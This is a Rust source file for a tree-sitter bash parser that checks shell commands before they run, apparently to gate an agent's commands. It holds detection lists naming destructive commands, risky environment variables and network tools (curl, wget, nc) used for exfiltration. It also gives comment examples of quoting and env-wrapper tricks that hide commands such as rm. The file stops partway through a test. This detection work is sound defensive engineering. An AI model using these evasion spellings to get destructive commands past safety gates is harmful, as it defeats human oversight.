//! Tree-sitter based bash command parser.
//!
//! Parses bash commands into an AST and extracts structured information
//! for security analysis. Catches obfuscation that regex-based detection
//! misses: quote splitting, command substitution, variable indirection,
//! subshells, and process substitution.

use tree_sitter::{Language, Node, Parser};

/// Parsed representation of a bash command for security analysis.
#[derive(Debug, Default, Clone)]
pub struct ParsedCommand {
    /// Original command string, kept for substring-style scans.
    pub raw: String,
    /// Top-level command names (the actual binaries being run).
    pub commands: Vec<String>,
    /// Full argument vector for each command, in source order: the
    /// command name followed by its arguments, with prefix variable
    /// assignments and redirections removed.
    ///
    /// Effect classification is argument-dependent for several binaries
    /// (`git push` vs `git status`, `find -delete` vs `find -name`), so
    /// the name alone is not enough to decide whether an invocation is
    /// read-only. Parallel to [`Self::commands`]: entry `i` of this list
    /// starts with entry `i` of that one.
    pub invocations: Vec<Vec<String>>,
    /// Variable assignments (FOO=bar).
    pub assignments: Vec<(String, String)>,
    /// Command substitutions ($(...) or `...`).
    pub substitutions: Vec<String>,
    /// Redirections (>, >>, <, 2>).
    pub redirections: Vec<String>,
    /// Whether the command uses pipes.
    pub has_pipes: bool,
    /// Whether the command chains with && or ||.
    pub has_chains: bool,
    /// Whether the command uses subshells ((...) or $(...)).
    pub has_subshell: bool,
    /// Whether the command uses process substitution <(...) or >(...).
    pub has_process_substitution: bool,
    /// Raw command strings from each pipeline segment.
    pub pipeline_segments: Vec<String>,
    /// Source text of every `command` node, in AST order — one entry per
    /// invocation including the ones inside chains, pipes and subshells.
    /// Unlike [`Self::commands`] (bare binary names) this keeps the
    /// arguments, which argument-sensitive gates need.
    pub command_texts: Vec<String>,
    /// Whether tree-sitter reported a syntax error or a missing node
    /// anywhere in the tree. A command that did not parse cleanly cannot
    /// be analysed, so safety gates must treat it as unknown.
    pub has_parse_error: bool,
}

/// Parse a bash command string into a structured representation.
pub fn parse_bash(command: &str) -> Option<ParsedCommand> {
    let mut parser = Parser::new();
    let language = tree_sitter_bash::LANGUAGE;
    parser.set_language(&Language::from(language)).ok()?;

    let tree = parser.parse(command, None)?;
    let root = tree.root_node();

    let mut parsed = ParsedCommand {
        raw: command.to_string(),
        has_parse_error: root.has_error(),
        ..ParsedCommand::default()
    };
    extract_from_node(root, command.as_bytes(), &mut parsed);
    Some(parsed)
}

/// Recursively walk the AST and extract command information.
fn extract_from_node(node: Node, source: &[u8], parsed: &mut ParsedCommand) {
    match node.kind() {
        "command" => {
            parsed.command_texts.push(node_text(node, source));
            // Extract the command name (first child that's a "command_name" or "word").
            if let Some(name_node) = node.child_by_field_name("name") {
                let name = node_text(name_node, source);
                parsed.commands.push(name);
            } else {
                // Fallback: first word child.
                for i in 0..node.child_count() {
                    let child = node.child(i as u32).unwrap();
                    if child.kind() == "word" || child.kind() == "command_name" {
                        parsed.commands.push(node_text(child, source));
                        break;
                    }
                }
            }
            let argv = command_argv(node, source);
            if !argv.is_empty() {
                parsed.invocations.push(argv);
            }
        }
        "variable_assignment" => {
            let name = node
                .child_by_field_name("name")
                .map(|n| node_text(n, source))
                .unwrap_or_default();
            let value = node
                .child_by_field_name("value")
                .map(|n| node_text(n, source))
                .unwrap_or_default();
            parsed.assignments.push((name, value));
        }
        "command_substitution" => {
            let text = node_text(node, source);
            parsed.substitutions.push(text);
            parsed.has_subshell = true;
        }
        "process_substitution" => {
            parsed.has_process_substitution = true;
        }
        "pipeline" => {
            parsed.has_pipes = true;
            // Extract each command in the pipeline.
            for i in 0..node.child_count() {
                let child = node.child(i as u32).unwrap();
                if child.kind() == "command" || child.kind() == "pipeline" {
                    let text = node_text(child, source);
                    parsed.pipeline_segments.push(text);
                }
            }
        }
        "list" => {
            // && and || chains.
            for i in 0..node.child_count() {
                let child = node.child(i as u32).unwrap();
                let kind = child.kind();
                if kind == "&&" || kind == "||" {
                    parsed.has_chains = true;
                }
            }
        }
        "redirected_statement" | "file_redirect" | "heredoc_redirect" => {
            let text = node_text(node, source);
            parsed.redirections.push(text);
        }
        "subshell" => {
            parsed.has_subshell = true;
        }
        _ => {}
    }

    // Recurse into children.
    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            extract_from_node(child, source, parsed);
        }
    }
}

/// Get text content of a node.
fn node_text(node: Node, source: &[u8]) -> String {
    node.utf8_text(source).unwrap_or("").to_string()
}

/// Collect the argument vector of a `command` node: the command name
/// plus every argument, skipping prefix variable assignments and
/// redirections (which are analysed separately).
fn command_argv(node: Node, source: &[u8]) -> Vec<String> {
    let mut argv = Vec::new();
    for i in 0..node.child_count() {
        let Some(child) = node.child(i as u32) else {
            continue;
        };
        match child.kind() {
            "variable_assignment"
            | "file_redirect"
            | "heredoc_redirect"
            | "herestring_redirect" => {}
            _ => {
                let text = node_text(child, source);
                if !text.is_empty() {
                    argv.push(text);
                }
            }
        }
    }
    argv
}

/// Strip one layer of shell quoting/escaping from a single token so
/// option matching cannot be defeated by writing `-'delete'` or
/// `-dele\te`.
///
/// Follows shell rules closely enough for matching: inside single
/// quotes a backslash is literal; elsewhere `\x` yields `x`. ANSI-C
/// quoting is decoded too — bash hands `$'git'` to the kernel as
/// `git`, so leaving the `$` in place would let that spelling walk
/// past every scan that matches on the unquoted token.
pub fn unquote_token(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                if c == '\'' {
                    quote = None;
                } else {
                    out.push(c);
                }
            }
            Some('"') => match c {
                '"' => quote = None,
                // Inside double quotes bash strips a backslash only
                // before these; before anything else it is preserved
                // (`"\_x"` stays `\_x` — it does not become `_x`).
                '\\' => match chars.peek() {
                    // A backslash-newline is a line continuation:
                    // both characters disappear.
                    Some('\n') => {
                        chars.next();
                    }
                    Some(&next @ ('$' | '`' | '"' | '\\')) => {
                        chars.next();
                        out.push(next);
                    }
                    _ => out.push('\\'),
                },
                _ => out.push(c),
            },
            // ANSI-C string body: `$'…'`, tracked as `Some('$')`.
            Some('$') => match c {
                '\'' => quote = None,
                '\\' => {
                    // An escape that evaluates to NUL truncates: bash
                    // drops the NUL and the rest of the quoted segment,
                    // so `$'git\x00junk'` is `git`. Skip to the closing
                    // quote (escapes still pair, so `\'` cannot end the
                    // segment early) or the head stays hidden.
                    if push_ansi_c_escape(&mut chars, &mut out) {
                        while let Some(rest) = chars.next() {
                            match rest {
                                '\'' => break,
                                '\\' => {
                                    chars.next();
                                }
                                _ => {}
                            }
                        }
                        quote = None;
                    }
                }
                _ => out.push(c),
            },
            Some(_) => unreachable!("only ', \" and $' open a quote"),
            None => match c {
                '\'' | '"' => quote = Some(c),
                '$' => match chars.peek() {
                    // ANSI-C quoting: bash decodes the escapes and the
                    // command sees only the result, so `$'git' push
                    // --force` executes `git push --force`.
                    Some('\'') => {
                        chars.next();
                        quote = Some('$');
                    }
                    // Locale translation `$"…"` behaves like `"…"`.
                    Some('"') => {
                        chars.next();
                        quote = Some('"');
                    }
                    _ => out.push('$'),
                },
                '\\' => match chars.next() {
                    Some('\n') | None => {}
                    Some(next) => out.push(next),
                },
                _ => out.push(c),
            },
        }
    }
    out
}

/// Decode one backslash escape inside an ANSI-C `$'…'` string,
/// pushing what bash would hand to the command. `$'r\x6d'` is `rm`,
/// so numeric escapes must decode to their character or the pattern
/// scans compare against the wrong text. Escapes bash leaves alone
/// are kept literally.
///
/// Returns `true` when the escape evaluates to NUL (`\0`, `\x00`,
/// `\u0000`, `\c@`, …): bash discards the NUL and everything after it
/// in the quoted segment, and the caller must truncate the same way.
fn push_ansi_c_escape(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    out: &mut String,
) -> bool {
    fn radix_value(
        chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
        radix: u32,
        max_digits: u32,
        seed: u32,
    ) -> u32 {
        let mut value = seed;
        let mut taken = 0;
        while taken < max_digits {
            match chars.peek().and_then(|c| c.to_digit(radix)) {
                Some(d) => {
                    chars.next();
                    value = value * radix + d;
                    taken += 1;
                }
                None => break,
            }
        }
        value
    }
    fn push_nul_or(decoded: char, out: &mut String) -> bool {
        if decoded == '\0' {
            true
        } else {
            out.push(decoded);
            false
        }
    }
    let Some(esc) = chars.next() else {
        out.push('\\');
        return false;
    };
    match esc {
        'a' => out.push('\x07'),
        'b' => out.push('\x08'),
        'e' | 'E' => out.push('\x1b'),
        'f' => out.push('\x0c'),
        'n' => out.push('\n'),
        'r' => out.push('\r'),
        't' => out.push('\t'),
        'v' => out.push('\x0b'),
        '\\' | '\'' | '"' | '?' => out.push(esc),
        'x' => match chars.peek().and_then(|c| c.to_digit(16)) {
            Some(_) => {
                return push_nul_or(char::from(radix_value(chars, 16, 2, 0) as u8), out);
            }
            None => out.push_str("\\x"),
        },
        'u' | 'U' => {
            let max = if esc == 'u' { 4 } else { 8 };
            match chars.peek().and_then(|c| c.to_digit(16)) {
                // Bash omits an out-of-range code point rather than
                // substituting anything, so `$'\Uffffffffgit'` is
                // `git`; inventing a character here would hide it.
                Some(_) => {
                    let value = radix_value(chars, 16, max, 0);
                    return match char::from_u32(value) {
                        Some(decoded) => push_nul_or(decoded, out),
                        None => false,
                    };
                }
                None => {
                    out.push('\\');
                    out.push(esc);
                }
            }
        }
        d @ '0'..='7' => {
            // Octal, up to three digits counting this one; bash keeps
            // the low eight bits.
            let value = radix_value(chars, 8, 2, d.to_digit(8).unwrap_or(0));
            return push_nul_or(char::from((value & 0xff) as u8), out);
        }
        'c' => match chars.next() {
            // `\cX` is Ctrl-X, masked the way bash masks it: `x & 0x1f`
            // (with `\c?` as DEL). An XOR would map non-letters onto
            // printable text — `\c3` must become byte 0x13, not `s`,
            // or `printf %s $'\c3hutdown'` reads as `shutdown`.
            Some('?') => out.push('\x7f'),
            Some(ctl) if ctl.is_ascii() => {
                return push_nul_or(char::from((ctl as u8) & 0x1f), out);
            }
            Some(other) => out.push(other),
            None => out.push_str("\\c"),
        },
        other => {
            out.push('\\');
            out.push(other);
        }
    }
    false
}

/// Strip a leading path from an already-unquoted command name.
pub fn base_name(name: &str) -> String {
    name.rsplit('/').next().unwrap_or(name).to_string()
}

/// Commands whose operands are text to print, match or transform —
/// never a program to run. A shell name among *their* arguments is
/// data: `printf '%s\n' bash -c "'git' push --force"` prints four
/// words.
///
/// Only this direction is listed. An unrecognised head keeps counting
/// as a possible runner, so `firejail bash -c '…'` and every other
/// runner nobody enumerated still recurse.
/// Interpreters that can run a command are deliberately absent, even
/// though their operands look like text: `awk 'BEGIN{system(ARGV[1] …
/// )}' git push -uf` executes what follows, and `sed`'s `e` and the
/// pagers' shell escapes do the same. Their arguments are not data.
pub(crate) const DATA_COMMANDS: &[&str] = &[
    "echo", "printf", "cat", "tee", "grep", "egrep", "fgrep", "rg", "ag", "tr", "cut", "paste",
    "sort", "uniq", "head", "tail", "wc", "fold", "column", "diff", "comm", "jq", "yq", "strings",
    "logger",
];

/// Commands whose job is to run the command that follows them, so the
/// wrapper name says nothing about what actually executes.
/// `exec` is here because it replaces the shell with what follows, so
/// `exec env -S '…'` runs whatever that `env` resolves to; leaving it
/// out stopped the walk at `exec` and reported nothing wrapped.
const COMMAND_WRAPPERS: &[&str] = &["env", "command", "nohup", "setsid", "exec"];

/// True when `tok` is a `NAME=value` environment assignment.
pub fn is_env_assignment(tok: &str) -> bool {
    match tok.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.')
        }
        None => false,
    }
}

/// `env` short options that take an operand, attached (`-uPATH`) or as
/// the next token (`-u PATH`). The operand must be consumed, or it gets
/// mistaken for the wrapped command. Union of GNU (`-u -C -a -S`) and
/// BSD (`-u -C -P -S -L -U`) — each implementation rejects the other's
/// options at runtime, so consuming an operand for a foreign option
/// never mislocates a command that actually executes.
const ENV_OPERAND_SHORTS: &[char] = &['u', 'C', 'a', 'S', 'P', 'L', 'U'];

/// `env` short options that never take an operand.
const ENV_PLAIN_SHORTS: &[char] = &['i', '0', 'v'];

#[derive(Clone, Copy)]
enum EnvLong {
    /// No separate operand. Covers `--block/default/ignore-signal`,
    /// whose optional argument only attaches in the `=SIG` form.
    Plain,
    /// Takes an operand, attached with `=` or as the next token.
    Operand,
    /// `--split-string`: the operand holds the wrapped command itself.
    SplitString,
}

/// GNU env's long options, for resolving abbreviations.
const ENV_LONGS: &[(&str, EnvLong)] = &[
    ("argv0", EnvLong::Operand),
    ("block-signal", EnvLong::Plain),
    ("chdir", EnvLong::Operand),
    ("debug", EnvLong::Plain),
    ("default-signal", EnvLong::Plain),
    ("help", EnvLong::Plain),
    ("ignore-environment", EnvLong::Plain),
    ("ignore-signal", EnvLong::Plain),
    ("list-signal-handling", EnvLong::Plain),
    ("null", EnvLong::Plain),
    ("split-string", EnvLong::SplitString),
    ("unset", EnvLong::Operand),
    ("version", EnvLong::Plain),
];

/// Resolve an env long option the way coreutils does: exact name, or
/// any unambiguous prefix (`--deb` means `--debug`). `None` for
/// unknown or ambiguous names — env rejects those at runtime, so no
/// command executes behind them and aborting the unwrap hides nothing.
fn resolve_env_long(name: &str) -> Option<EnvLong> {
    if name.is_empty() {
        return None;
    }
    if let Some((_, kind)) = ENV_LONGS.iter().find(|(n, _)| *n == name) {
        return Some(*kind);
    }
    let mut candidates = ENV_LONGS.iter().filter(|(n, _)| n.starts_with(name));
    match (candidates.next(), candidates.next()) {
        (Some((_, kind)), None) => Some(*kind),
        _ => None,
    }
}

/// Tokens of the command a wrapper invocation runs (`tokens[0]` is the
/// wrapper), with the wrapper's options and their operands consumed.
/// [`Unwrap::None`] when no command executes behind the arguments —
/// including options this parser does not know, which env rejects.
/// [`Unresolved::Expansion`] when a command runs but only expansion decides
/// which; mislocating it would hand restrictive rules text that
/// silently fails to match.
fn strip_wrapper(tokens: &[String]) -> Unwrap {
    macro_rules! reject_unless {
        ($opt:expr) => {
            match $opt {
                Some(v) => v,
                None => return Unwrap::None,
            }
        };
    }
    let head = base_name(reject_unless!(tokens.first()));
    let is_env = head == "env";
    // `exec -a NAME cmd` renames argv[0]: the name is the option's
    // operand, not the command being run.
    let is_exec = head == "exec";
    let rest = &tokens[1..];
    let mut i = 0;
    while i < rest.len() {
        let tok = rest[i].as_str();
        if tok == "--" {
            i += 1;
            break;
        }
        if is_env_assignment(tok) {
            i += 1;
            continue;
        }
        if let Some(long) = tok.strip_prefix("--") {
            if !is_env {
                i += 1;
                continue;
            }
            let (name, inline) = match long.split_once('=') {
                Some((n, v)) => (n, Some(v.to_string())),
                None => (long, None),
            };
            match reject_unless!(resolve_env_long(name)) {
                EnvLong::Plain => i += 1,
                EnvLong::Operand => match inline {
                    Some(_) => i += 1,
                    None => {
                        reject_unless!(rest.get(i + 1));
                        i += 2;
                    }
                },
                EnvLong::SplitString => {
                    let (operand, next) = match inline {
                        Some(v) => (v, i + 1),
                        None => (reject_unless!(rest.get(i + 1)).clone(), i + 2),
                    };
                    return split_string_tokens(&tokens[0], &operand, &rest[next..]);
                }
            }
            continue;
        }
        if let Some(cluster) = tok.strip_prefix('-') {
            if is_exec && !cluster.is_empty() {
                match cluster.find('a') {
                    // `-a NAME` and `-aNAME`, clustered or not.
                    Some(pos) if cluster[pos + 1..].is_empty() => {
                        reject_unless!(rest.get(i + 1));
                        i += 2;
                    }
                    _ => i += 1,
                }
                continue;
            }
            if !is_env || cluster.is_empty() {
                // Bare `-` is env's shorthand for `-i`; non-env
                // wrappers have no operand-taking options to consume.
                i += 1;
                continue;
            }
            let mut consumed_next = false;
            let mut split_operand: Option<String> = None;
            for (pos, c) in cluster.char_indices() {
                if ENV_PLAIN_SHORTS.contains(&c) {
                    continue;
                }
                if !ENV_OPERAND_SHORTS.contains(&c) {
                    return Unwrap::None;
                }
                let attached = &cluster[pos + c.len_utf8()..];
                let operand = if attached.is_empty() {
                    consumed_next = true;
                    reject_unless!(rest.get(i + 1)).clone()
                } else {
                    attached.to_string()
                };
                if c == 'S' {
                    split_operand = Some(operand);
                }
                break;
            }
            let next = i + 1 + usize::from(consumed_next);
            if let Some(operand) = split_operand {
                return split_string_tokens(&tokens[0], &operand, &rest[next..]);
            }
            i = next;
            continue;
        }
        break;
    }
    let out = rest[i..].to_vec();
    if out.is_empty() {
        Unwrap::None
    } else {
        Unwrap::Tokens(out)
    }
}

/// `env -S STRING` splits STRING into further `env` arguments — not
/// straight into the command. `env -S '-u DUMMY rm -f x'` still has
/// options to process, so the split words are handed back with an
/// `env` head and re-enter option parsing on the next pass.
fn split_string_tokens(wrapper: &str, operand: &str, remainder: &[String]) -> Unwrap {
    let mut out = vec![wrapper.to_string()];
    match split_env_s(operand) {
        Unwrap::Tokens(words) => out.extend(words),
        other => return other,
    }
    out.extend_from_slice(remainder);
    Unwrap::Tokens(out)
}

/// Outcome of locating the command a wrapper runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Unwrap {
    /// The wrapped command's tokens.
    Tokens(Vec<String>),
    /// A command runs but this parser cannot say which. Gates must
    /// treat it as unknown, not as "nothing wrapped" — a silent drop
    /// lets a broad allow through and hides the command from the
    /// destructive-command scan.
    Unresolved(Unresolved),
    /// Nothing was unwrapped: the head is not a wrapper, or the
    /// arguments are ones env itself rejects, so no command executes
    /// behind them.
    None,
}

/// Why a wrapper chain resolved to no identifiable command even though
/// one runs. Every variant is a *resolution failure*, never an
/// all-clear: the only correct response is to fail closed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unresolved {
    /// Run-time expansion decides the command: `env -S` expands
    /// `${VAR}` itself, so `CMD=rm env -S '${CMD} -rf x'` executes
    /// `rm`.
    Expansion,
    /// The wrapper chain outruns [`MAX_UNWRAP_HOPS`]. A command still
    /// executes behind the wrappers; this parser just never reached
    /// it.
    Depth,
}

/// Split an `env -S` string the way GNU env does: whitespace-separated
/// words, single and double quotes, backslash escapes, `#` comments
/// and the `\c` terminator. [`Unresolved::Expansion`] when `$` expansion
/// decides the command; [`Unwrap::None`] for sequences env rejects at
/// runtime, behind which nothing executes anyway.
fn split_env_s(s: &str) -> Unwrap {
    fn end_word(cur: &mut String, in_word: &mut bool, words: &mut Vec<String>) {
        if *in_word {
            words.push(std::mem::take(cur));
            *in_word = false;
        }
    }
    macro_rules! next_or_reject {
        ($chars:expr) => {
            match $chars.next() {
                Some(c) => c,
                None => return Unwrap::None,
            }
        };
    }
    let mut words: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = s.chars();
    'outer: while let Some(c) = chars.next() {
        match c {
            c if c.is_whitespace() => end_word(&mut cur, &mut in_word, &mut words),
            '#' if !in_word => break,
            '$' => return Unwrap::Unresolved(Unresolved::Expansion),
            '\'' => {
                in_word = true;
                loop {
                    match next_or_reject!(chars) {
                        '\'' => break,
                        '\\' => match next_or_reject!(chars) {
                            esc @ ('\'' | '\\') => cur.push(esc),
                            _ => return Unwrap::None,
                        },
                        ch => cur.push(ch),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match next_or_reject!(chars) {
                        '"' => break,
                        '$' => return Unwrap::Unresolved(Unresolved::Expansion),
                        '\\' => {
                            let esc = next_or_reject!(chars);
                            if esc == '_' {
                                cur.push(' ');
                            } else {
                                match env_s_escape(esc) {
                                    Some(ch) => cur.push(ch),
                                    None => return Unwrap::None,
                                }
                            }
                        }
                        ch => cur.push(ch),
                    }
                }
            }
            '\\' => match next_or_reject!(chars) {
                'c' => break 'outer,
                // Outside quotes `\_` separates words.
                '_' => end_word(&mut cur, &mut in_word, &mut words),
                esc => {
                    in_word = true;
                    match env_s_escape(esc) {
                        Some(ch) => cur.push(ch),
                        None => return Unwrap::None,
                    }
                }
            },
            ch => {
                in_word = true;
                cur.push(ch);
            }
        }
    }
    if in_word {
        words.push(cur);
    }
    if words.is_empty() {
        Unwrap::None
    } else {
        Unwrap::Tokens(words)
    }
}

/// One `env -S` backslash escape; `None` for sequences GNU env
/// rejects.
fn env_s_escape(c: char) -> Option<char> {
    Some(match c {
        '\\' | '#' | '$' | '"' | '\'' => c,
        'f' => '\x0c',
        'n' => '\n',
        'r' => '\r',
        't' => '\t',
        'v' => '\x0b',
        _ => return None,
    })
}

/// How many wrappers may be stripped before the chain is declared
/// unresolvable. A bound is kept rather than removed so a wrapper that
/// re-expands into itself cannot spin here; running out of it is a
/// failure to resolve, not an all-clear.
const MAX_UNWRAP_HOPS: usize = 8;

/// The invocation's tokens with any leading wrapper chain stripped.
/// Resolution is retried after every strip, so a chain exactly as long
/// as the budget still names its command; only a chain that is *still*
/// wrapped once the budget is spent is [`Unresolved::Depth`].
fn unwrapped_tokens(argv: &[String]) -> Unwrap {
    let mut tokens: Vec<String> = argv.iter().map(|a| unquote_token(a)).collect();
    let mut unwrapped = false;
    let mut hops = 0;
    loop {
        let Some(first) = tokens.first() else {
            return Unwrap::None;
        };
        if !COMMAND_WRAPPERS.contains(&base_name(first).as_str()) {
            return if unwrapped {
                Unwrap::Tokens(tokens)
            } else {
                Unwrap::None
            };
        }
        if hops == MAX_UNWRAP_HOPS {
            return Unwrap::Unresolved(Unresolved::Depth);
        }
        match strip_wrapper(&tokens) {
            Unwrap::Tokens(next) => tokens = next,
            other => return other,
        }
        unwrapped = true;
        hops += 1;
    }
}

/// For a wrapper invocation (`env`, `command`, `nohup`, `setsid`),
/// return the base name of the command it would run. `None` when the
/// head is not a wrapper or no wrapped command can be identified.
fn unwrapped_head(argv: &[String]) -> Option<String> {
    match unwrapped_tokens(argv) {
        Unwrap::Tokens(tokens) => Some(base_name(&tokens[0])),
        _ => None,
    }
}

/// For each invocation, the text with any leading wrapper chain
/// (`env`, `command`, `nohup`, `setsid` — plus their flags, operands
/// and VAR=value assignments) stripped: `env -u PATH git status`
/// yields `git status`. Only invocations that actually had a wrapper
/// are returned. Lets restrictive permission rules keep matching a
/// command that has been wrapped — the widening side never uses
/// this, so unwrapping can only remove permissions, never grant.
pub fn unwrapped_invocation_texts(parsed: &ParsedCommand) -> Vec<String> {
    parsed
        .invocations
        .iter()
        .filter_map(|argv| match unwrapped_tokens(argv) {
            Unwrap::Tokens(tokens) => Some(tokens.join(" ")),
            _ => None,
        })
        .collect()
}

/// The words GNU `env -S` splits an operand into. `None` when the
/// split cannot be known statically (`$` expansion decides it) or when
/// env would reject the string, so nothing runs behind it.
///
/// Exposed so gates that need to see what `-S` unpacks — environment
/// assignments, for one — read the same semantics the wrapper
/// resolution uses instead of approximating them.
pub fn env_split_string(operand: &str) -> Option<Vec<String>> {
    match split_env_s(operand) {
        Unwrap::Tokens(words) => Some(words),
        _ => None,
    }
}

/// The tokens a wrapper chain runs, for gates that need the argv
/// rather than the joined text of [`unwrapped_invocation_texts`].
/// `None` when the head is not a wrapper, or no wrapped command can be
/// identified — including the unresolved cases, which
/// [`unresolved_wrapper`] reports separately so callers can fail
/// closed instead of treating them as "nothing wrapped".
pub fn unwrapped_argv(argv: &[String]) -> Option<Vec<String>> {
    match unwrapped_tokens(argv) {
        Unwrap::Tokens(tokens) => Some(tokens),
        _ => None,
    }
}

/// The reason some invocation runs a command this parser cannot name —
/// run-time expansion (`env -S '${CMD} -rf x'`) or a wrapper chain
/// past [`MAX_UNWRAP_HOPS`] (`env env … env rm x`). Either way the
/// command text a gate would match is unknowable, so widening rules
/// must fail closed rather than treat the invocation as "nothing
/// wrapped".
pub fn unresolved_wrapper(parsed: &ParsedCommand) -> Option<Unresolved> {
    parsed.invocations.iter().find_map(|argv| {
        // A head whose operands are text runs nothing they name, so a
        // wrapper word among them is data: `printf '%s\n' env -S
        // '${CMD}'` prints it. Being wrong about this list can only
        // report an unknown that is not one, which is the safe way to
        // be wrong.
        // The head that decides is the one that ends up running, so a
        // wrapped data command is still one: `env printf '%s\n' env -S
        // '${CMD}'` prints its operands exactly as `printf` alone does.
        let unwrapped = unwrapped_argv(argv);
        let head = unwrapped
            .as_ref()
            .and_then(|tokens| tokens.first())
            .or_else(|| argv.first());
        let head_is_data = head.is_some_and(|t| {
            DATA_COMMANDS.contains(&base_name(&unquote_token(t)).to_lowercase().as_str())
        });
        if head_is_data {
            return None;
        }
        // Resolve from every word, not only the first. What precedes a
        // wrapper decides nothing about whether that wrapper resolves,
        // and the name in front need not be one this list knows —
        // `exec env -S '${CMD}'`, `stdbuf -o0 env -S '${CMD}'` and
        // `sudo env -S '${CMD}'` are each the same unknown as `env -S
        // '${CMD}'` alone. Starting only at the head made every name
        // nobody enumerated a way to hide one.
        //
        // Only a word that names a wrapper is resolved from. Resolving
        // from every one copies the whole suffix each time, which is
        // quadratic in the argument count for arguments that could
        // never resolve to anything.
        argv.iter()
            .enumerate()
            .filter(|(_, word)| {
                COMMAND_WRAPPERS.contains(&base_name(&unquote_token(word)).as_str())
            })
            .find_map(|(start, _)| match unwrapped_tokens(&argv[start..]) {
                Unwrap::Unresolved(reason) => Some(reason),
                _ => None,
            })
    })
}

/// True when some invocation runs a command whose identity this parser
/// cannot pin down: run-time expansion decides it (`env -S '${CMD} -rf
/// x'`), or the wrapper chain ran past [`MAX_UNWRAP_HOPS`] before the
/// command was reached. The command text a gate would match is
/// unknowable either way, so widening rules must fail closed rather than
/// treat the invocation as "nothing wrapped".
///
/// Restored on this branch's richer [`Unwrap`] representation: `main`
/// expressed this state as a single `Unwrap::Dynamic`, which became
/// [`Unresolved`] here. Every `Unresolved` reason is dynamic in the sense
/// the callers care about, so both map to `true`.
pub fn has_dynamic_wrapper(parsed: &ParsedCommand) -> bool {
    parsed
        .invocations
        .iter()
        .any(|argv| matches!(unwrapped_tokens(argv), Unwrap::Unresolved(_)))
}

/// Check a parsed command against security rules.
/// Returns a list of security violations found.
pub fn check_parsed_security(parsed: &ParsedCommand) -> Vec<String> {
    let mut violations = Vec::new();

    // Check each command name against dangerous commands.
    const DANGEROUS_COMMANDS: &[&str] = &[
        "rm", "shred", "dd", "mkfs", "wipefs", "shutdown", "reboot", "halt", "poweroff", "kill",
        "killall", "pkill",
    ];

    // Command names, plus the command each `env`-style wrapper runs —
    // `env rm x` must be seen as `rm`, not as `env`.
    let mut heads: Vec<String> = parsed
        .commands
        .iter()
        .map(|c| base_name(&unquote_token(c)))
        .collect();
    for argv in &parsed.invocations {
        if let Some(inner) = unwrapped_head(argv) {
            heads.push(inner);
        }
    }

    match unresolved_wrapper(parsed) {
        Some(Unresolved::Expansion) => violations.push(
            "Wrapped command is chosen by run-time expansion (env -S with $), so what executes \
             cannot be determined"
                .to_string(),
        ),
        Some(Unresolved::Depth) => violations.push(format!(
            "Wrapper chain runs deeper than {MAX_UNWRAP_HOPS} levels, so what executes behind it \
             cannot be determined"
        )),
        None => {}
    }

    for base in &heads {
        if DANGEROUS_COMMANDS.contains(&base.as_str()) {
            violations.push(format!(
                "Dangerous command '{base}' detected in AST (not bypassable with quoting tricks)"
            ));
        }
    }

    // Check for dangerous variable assignments.
    const DANGEROUS_VARS: &[&str] = &[
        "PATH",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "PROMPT_COMMAND",
        "BASH_ENV",
        "ENV",
        "IFS",
        "CDPATH",
        "GLOBIGNORE",
    ];

    for (name, _value) in &parsed.assignments {
        if DANGEROUS_VARS.contains(&name.as_str()) {
            violations.push(format!(
                "Dangerous variable assignment: {name}= (detected via AST, not bypassable)"
            ));
        }
    }

    // Check for command substitutions containing dangerous commands.
    for sub in &parsed.substitutions {
        let sub_lower = sub.to_lowercase();
        if sub_lower.contains("curl")
            || sub_lower.contains("wget")
            || sub_lower.contains("nc ")
            || sub_lower.contains("ncat")
        {
            violations.push(format!(
                "Network command in substitution: {sub} (data exfiltration risk)"
            ));
        }
    }

    // Check for suspicious redirections to system paths.
    for redir in &parsed.redirections {
        if redir.contains("/dev/sd")
            || redir.contains("/dev/null") && redir.contains("2>")
            || redir.contains("/etc/")
            || redir.contains("/usr/")
        {
            // /dev/null stderr redirect is fine, but writing to /dev/sd* or /etc/ is not.
            if !redir.contains("/dev/null") {
                violations.push(format!("Suspicious redirection to system path: {redir}"));
            }
        }
    }

    // Check for eval-like patterns with variables.
    for cmd in &parsed.commands {
        if cmd == "eval" && !parsed.assignments.is_empty() {
            violations.push(
                "eval with variable assignments in same command (arbitrary code execution)".into(),
            );
        }
    }

    violations
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simple_command() {
        let parsed = parse_bash("ls -la").unwrap();
        assert!(parsed.commands.contains(&"ls".to_string()));
    }

    #[test]
    fn test_parse_pipe() {
        let parsed = parse_bash("cat file.txt | grep pattern").unwrap();
        assert!(parsed.has_pipes);
        assert!(parsed.commands.contains(&"cat".to_string()));
        assert!(parsed.commands.contains(&"grep".to_string()));
    }

    #[test]
    fn test_parse_chain() {
        let parsed = parse_bash("echo hello && echo world").unwrap();
        assert!(parsed.has_chains);
    }

    #[test]
    fn test_parse_variable_assignment() {
        let parsed = parse_bash("FOO=bar echo test").unwrap();
        assert!(!parsed.assignments.is_empty());
        assert_eq!(parsed.assignments[0].0, "FOO");
    }

    #[test]
    fn test_parse_command_substitution() {
        let parsed = parse_bash("echo $(whoami)").unwrap();
        assert!(!parsed.substitutions.is_empty());
        assert!(parsed.has_subshell);
    }

    #[test]
    fn test_parse_redirection() {
        let parsed = parse_bash("echo hello > output.txt").unwrap();
        assert!(!parsed.redirections.is_empty());
    }

    #[test]
    fn test_detect_dangerous_command() {
        let parsed = parse_bash("rm -rf /tmp/test").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(!violations.is_empty());
        assert!(violations[0].contains("rm"));
    }

    #[test]
    fn test_detect_quoted_dangerous_command() {
        // Tree-sitter sees through quotes to the actual command, and the
